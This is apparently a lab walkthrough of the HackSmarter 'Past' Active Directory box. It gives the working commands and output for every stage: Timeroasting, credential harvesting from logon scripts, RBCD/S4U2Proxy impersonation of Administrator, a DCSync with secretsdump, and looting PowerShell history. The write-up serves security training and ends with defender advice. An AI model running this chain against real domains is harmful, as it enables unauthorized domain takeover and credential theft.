---
layout: default
title: "HackSmarter: Past — Timeroasting to Domain Admin"
description: "Full walkthrough of the HackSmarter 'Past' Active Directory lab (Medium): unauthenticated Timeroasting, a NETLOGON credential leak, a Protected Users account with GenericAll over the Domain Controller, and Resource-Based Constrained Delegation abuse to Domain Admin."
date: 2026-06-12
author: p3ta00
tags: ["hacksmarter", "active-directory", "timeroasting", "rbcd", "protected-users", "kerberos", "delegation", "writeup", "medium"]
image: /assets/images/hacksmarter/past-banner.png
keywords:
  - HackSmarter Past
  - Timeroasting
  - Resource-Based Constrained Delegation
  - Protected Users
  - RBCD S4U2Proxy
  - Active Directory writeup
---

<div class="terminal-output">
  <p>
    <span class="prompt-symbol">$</span> <span style="color: var(--cyan);">cat ~/blog/hacksmarter-past.md</span>
  </p>
</div>

![Past — HackSmarter](/assets/images/hacksmarter/past-banner.png)

## Overview

**Past** is a **Medium** Active Directory box on HackSmarter. The client — *Past Systems Inc.* — mentioned during the kickoff that they were "currently adding new machines to the network." That throwaway remark is the entire foothold: the freshly **pre-staged computer accounts** were created with weak, human-chosen passwords instead of the random 120-character secrets AD normally assigns.

We start from an **assumed-network** position — VPN access, **no credentials** — and chain:

1. **Timeroasting** (unauthenticated) → crack a weak machine-account password
2. A **cleartext credential** leaked in a NETLOGON logon script
3. A **Protected Users** account that nonetheless holds **GenericAll over the Domain Controller** and **Server Operators**
4. **Resource-Based Constrained Delegation (RBCD)** abuse → impersonate Administrator → **DCSync**

> All hashes, passwords, and flags in this post are **redacted**.

---

## Phase 1 — Enumeration

### Port Scan

Kerberos (88), LDAP (389/3268), DNS (53), and `past.local` in the certificate identify a **Domain Controller**.

```
$ nmap $TARGET -A
Nmap scan report for EC2AMAZ-A5O4OL8.past.local (10.1.186.193)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: past.local)
445/tcp  open  microsoft-ds  Windows Server 2016 Datacenter 14393
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: past.local)
3389/tcp open  ms-wbt-server
```

> **Tip:** the host drops ICMP, so `ping` fails even though it's up. On Windows targets, confirm reachability with a TCP port (`nc -zv <ip> 445`), never `ping`. And map the FQDN in `/etc/hosts` immediately — Kerberos authenticates against SPNs tied to hostnames, so targeting the bare IP breaks almost every later step.

### User Enumeration

`Null Auth: True` lets the Guest account RID-brute the domain over SMB — no credentials needed.

```
$ nxc smb $TARGET -u guest -p '' --rid-brute
500: PAST\Administrator (SidTypeUser)
1008: PAST\tyler (SidTypeUser)
1115: PAST\APPDEV01$ (SidTypeUser)
1116: PAST\WEBDEV01$ (SidTypeUser)
1117: PAST\DEV01$ (SidTypeUser)
1121: PAST\ryan (SidTypeUser)
```

Two human users — **tyler** and **ryan** — and three "DEV" **machine accounts** (the trailing `$`). The DEV accounts line up with the "new machines being added" remark.

### Guest Share Access

Guest can read a non-default share, `Share`, holding `AD_machines.txt`:

```
$ nxc smb $TARGET -u guest -p '' --shares
Share           READ
IPC$            READ

$ cat AD_machines.txt
Name            DNSHostName
----            -----------
EC2AMAZ-A5O4OL8 EC2AMAZ-A5O4OL8.past.local
APPDEV01
WEBDEV01
DEV01
```

The DEV computer objects have **no DNSHostName** — confirming they're pre-staged accounts with no live host. NetExec's spider also drops a JSON of file metadata whose `*_epoch` timestamps nudge toward a time-based attack.

---

## Phase 2 — Unauthenticated Foothold via Timeroasting

**Timeroasting** abuses MS-SNTP (the authenticated NTP variant AD uses). A client can request a time response whose MAC is derived from a **computer account's NT hash**, keyed by **RID** — and crucially, **without authenticating**. The result is an offline-crackable hash of the machine-account password.

```
$ nxc smb $TARGET -u guest -p '' -M timeroast
[*] Starting Timeroasting...
1115:$sntp-ms$[REDACTED]
1116:$sntp-ms$[REDACTED]
1117:$sntp-ms$[REDACTED]
```

The hash type is hashcat mode **31300**; that mode wasn't available in this Exegol build, but **John the Ripper** handles the same format as `timeroast`:

```
$ john --format=timeroast --wordlist=rockyou.txt hashes
Loaded 4 password hashes with 4 different salts (timeroast, SNTP-MS [MD4+MD5 32/64])

[*] === cracked ===
1115:[REDACTED]
```

RID **1115 = APPDEV01$**. Machine passwords are normally random and uncrackable — this one fell instantly because the account was pre-staged with a weak password, exactly the weakness the brief telegraphed.

### Validating — and a trap to avoid

Spraying the recovered password surfaces one real result and one trap:

```
$ nxc smb $TARGET -u users -p '[REDACTED]'
[-] past.local\ryan:...          STATUS_LOGON_FAILURE
[-] past.local\tyler:...         STATUS_ACCOUNT_RESTRICTION
[-] past.local\administrator:... STATUS_LOGON_FAILURE
```

> **Do NOT read tyler's `STATUS_ACCOUNT_RESTRICTION` as "correct password, just restricted"** — the most common misread of this box. As we confirm in Phase 4, tyler is in **Protected Users**, which **disables NTLM** for the account, so the DC returns `ACCOUNT_RESTRICTION` to *every* NTLM attempt **regardless of whether the password is right**. The recovered password belongs to APPDEV01$, **not** tyler. NTLM cannot validate tyler; only Kerberos can.

Confirm the machine account properly — a genuine success shows `[+]` with **no `(Guest)`** tag:

```
$ nxc smb $TARGET -u 'APPDEV01$' -p '[REDACTED]' --shares
[+] past.local\APPDEV01$:...
NETLOGON        READ
SYSVOL          READ
```

---

## Phase 3 — Authenticated Enumeration as APPDEV01$

### Delegation Review

```
$ findDelegation.py past.local/'APPDEV01$':'[REDACTED]' -dc-ip $TARGET
AccountName       AccountType  DelegationType              DelegationRightsTo
----------------  -----------  --------------------------  ------------------
EC2AMAZ-A5O4OL8$  Computer     Unconstrained               N/A
tyler             Person       Resource-Based Constrained  DEV01$
```

Collecting the graph with BloodHound exposes the edge that actually matters — **tyler → GenericAll → the DC**:

```
$ bloodhound-python -u 'APPDEV01$' -p '[REDACTED]' -d past.local -ns $TARGET -c All --zip
INFO: Found 4 computers / 7 users / 53 groups
INFO: Compressing output into 20260612113630_bloodhound.zip
```

![BloodHound — tyler GenericAll over the DC](/assets/images/hacksmarter/past-bloodhound.png)

> **The key finding:** tyler holds **GenericAll over the Domain Controller computer object**, and is a member of both **Protected Users** and **Server Operators**. The `tyler → RBCD → DEV01$` row is a **red herring** — DEV01 is a pre-staged account with no live host, so a ticket to it is useless. The real lever is GenericAll *on the DC*.

### NETLOGON Credential Leak

As APPDEV01$ we can now read `NETLOGON`/`SYSVOL`. Logon scripts and GPO files are a classic credential source:

```
$ grep -ri tyler
NETLOGON/tyler_init.cmd:set TYLER_USER=tyler
NETLOGON/tyler_init.cmd:set TYLER_PASS=[REDACTED]
SYSVOL/past.local/scripts/tyler_init.cmd:set TYLER_PASS=[REDACTED]
```

A logon helper script hard-codes **tyler's password** in cleartext — the modern equivalent of a GPP `cpassword` leak.

---

## Phase 4 — Authenticating as tyler (Protected Users)

Even with the *correct* password, NTLM still refuses tyler:

```
$ nxc smb $TARGET -u 'tyler' -p '[REDACTED]'
[-] past.local\tyler:... STATUS_ACCOUNT_RESTRICTION
```

> **Why:** **Protected Users** disables NTLM (hence `ACCOUNT_RESTRICTION` even with the right password), disables RC4/DES Kerberos etypes (forcing RC4 → `KDC_ERR_ETYPE_NOSUPP`), forces **AES-only Kerberos**, and blocks delegation of the account. Pass-the-hash, over-pass-the-hash, and NTLM relay are all dead — the only way in is **AES Kerberos with the real password**.

Request a TGT over Kerberos and load it:

```
$ getTGT.py -dc-ip 10.1.186.193 past.local/tyler:'[REDACTED]'
[*] Saving ticket in tyler.ccache
$ export KRB5CCNAME=tyler.ccache

$ nxc smb $TARGET -k --use-kcache
[+] PAST.LOCAL\tyler from ccache
```

tyler's **Server Operators** membership grants `SeBackupPrivilege`/`SeRestorePrivilege` on the DC, which surfaces as **READ/WRITE on `C$`**:

```
$ nxc smb $TARGET -k --use-kcache --shares
ADMIN$   READ
C$       READ,WRITE
```

---

## Phase 5 — Privilege Escalation: GenericAll → RBCD → S4U2Proxy

### The concept

`GenericAll` over a **computer object** does not let you "log in as" that computer. You exploit it by writing an attribute and having a **separate controlled principal** abuse it:

1. As **tyler** (the GenericAll holder), write `msDS-AllowedToActOnBehalfOfOtherIdentity` on the **DC** so it trusts a computer account we control.
2. As that **computer account**, run S4U2Self + S4U2Proxy to mint a service ticket *as Administrator* to the DC.

tyler can't be the impersonating principal — he's in Protected Users (can't be delegated) and has no SPN. A **machine account** is required, and the default Machine Account Quota lets any authenticated user create one:

```
$ bloodyAD -k --host EC2AMAZ-A5O4OL8.past.local -d past.local add computer 'PWNED1' '[REDACTED]'
[+] PWNED1$ created
```

### Write the RBCD (as tyler)

```
$ bloodyAD -k --host EC2AMAZ-A5O4OL8.past.local -d past.local add rbcd 'EC2AMAZ-A5O4OL8$' 'PWNED1$'
[+] PWNED1$ can now impersonate users on EC2AMAZ-A5O4OL8$ via S4U2Proxy
```

`add rbcd <resource> <account-allowed-to-act>` — the *resource* is the DC (where tyler's GenericAll is spent); the *account* is our machine account.

### Impersonate Administrator (S4U2Proxy)

```
$ unset KRB5CCNAME
$ getST.py -spn cifs/EC2AMAZ-A5O4OL8.past.local -impersonate Administrator \
    past.local/'PWNED1$':'[REDACTED]' -dc-ip 10.1.186.193
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_EC2AMAZ-A5O4OL8.past.local@PAST.LOCAL.ccache
```

> **The #1 gotcha on this box:** if `KRB5CCNAME` is still exported when you run a **password**-based tool, impacket reuses the *cached* ticket and S4U2Self fails with `KRB_AP_ERR_BADMATCH`. Rule: **password auth → `unset KRB5CCNAME`; ticket auth → `export` it. Never both.**

### Root flag

The S4U ticket is for `cifs/` only (no TGT), so use it with an impacket tool — not `nxc --use-kcache`, which wants a TGT and fails silently:

```
$ export KRB5CCNAME=Administrator@cifs_EC2AMAZ-A5O4OL8.past.local@PAST.LOCAL.ccache
$ nxc smb EC2AMAZ-A5O4OL8.past.local -k --use-kcache --share C$ \
    --get-file 'Users\Administrator\Desktop\root.txt' root.txt
[+] past.local\Administrator from ccache (admin)
[+] File "Users\Administrator\Desktop\root.txt" was downloaded
```

```
root.txt: HSM{[REDACTED]}
```

### Interactive shell via WinRM

For a shell, request the ticket for the **HTTP** SPN (WinRM's service), not `cifs`:

```
$ getST.py -spn HTTP/EC2AMAZ-A5O4OL8.past.local -impersonate Administrator \
    past.local/'PWNED1$':'[REDACTED]' -dc-ip 10.1.186.193
[*] Saving ticket in Administrator@HTTP_EC2AMAZ-A5O4OL8.past.local@PAST.LOCAL.ccache

$ unset KRB5CCNAME
$ export KRB5CCNAME=Administrator@HTTP_EC2AMAZ-A5O4OL8.past.local@PAST.LOCAL.ccache
$ evil-winrm -i EC2AMAZ-A5O4OL8.past.local -r PAST.LOCAL
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

> **Match the ticket SPN to the tool:** `cifs/` → SMB/DCSync/psexec/wmiexec; `HTTP/` → WinRM. A ticket is minted for one SPN only.

---

## Phase 6 — Domain Compromise (DCSync)

```
$ secretsdump.py -k -no-pass past.local/administrator@EC2AMAZ-A5O4OL8.past.local
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
tyler:1008:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
ryan:1121:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
[*] Cleaning up...
```

Full domain compromise — the `krbtgt` hash enables Golden Tickets for persistence, and the Administrator NT hash gives an interactive SYSTEM shell via pass-the-hash.

> **On cracking the dump:** only the **human** NT hashes are worth cracking, and as **NTLM (`-m 1000`)** — not `-m 0`. A 32-hex NT hash is byte-identical to an MD5 digest, so auto-detectors guess MD5 and never crack it. Machine accounts and `krbtgt` are random; `31d6cfe0…` is the empty-password hash.

---

## Phase 7 — Post-Exploitation: ryan

ryan's NT hash didn't crack against rockyou, so we pivot to the Administrator profile's PowerShell history — operators frequently leave cleartext there:

```
*Evil-WinRM* PS ...\PSReadline> type ConsoleHost_history.txt
net user ryan [REDACTED] /add
net localgroup administrators /add ryan
net use \\dev01\c$
```

ryan's password is recovered from `ConsoleHost_history.txt`, showing the admin had provisioned ryan as a local administrator. `PSReadline` history is a first-class loot source once you have admin file access.

---

## Cleanup

```
$ bloodyAD -k --host EC2AMAZ-A5O4OL8.past.local -d past.local remove rbcd 'EC2AMAZ-A5O4OL8$' 'PWNED1$'
$ bloodyAD -k --host EC2AMAZ-A5O4OL8.past.local -d past.local del object 'PWNED1$'
```

---

## Key Takeaways

- **Timeroasting** is a strong unauthenticated opener against any DC; pre-staged or weak machine accounts fall to `hashcat -m 31300` (or John `--format=timeroast`).
- **`STATUS_ACCOUNT_RESTRICTION` on a Protected Users account is not a valid-password oracle** — NTLM is refused before the password is judged. Validate with Kerberos.
- **GenericAll on a computer object ≠ "become that computer"** — pivot through a controlled machine account (RBCD) or the computer's own identity (Shadow Credentials).
- **Kerberos hygiene:** FQDN everywhere (IP + `-k` → `KDC_ERR_S_PRINCIPAL_UNKNOWN`); `unset KRB5CCNAME` for password auth and `export` it for ticket auth; match the ticket SPN (`cifs` vs `HTTP`) to the tool.
- **Defenders:** don't pre-stage computer accounts with weak passwords, never store credentials in NETLOGON/SYSVOL logon scripts, and remember that **Server Operators** and **GenericAll on a DC** are effectively Domain Admin.
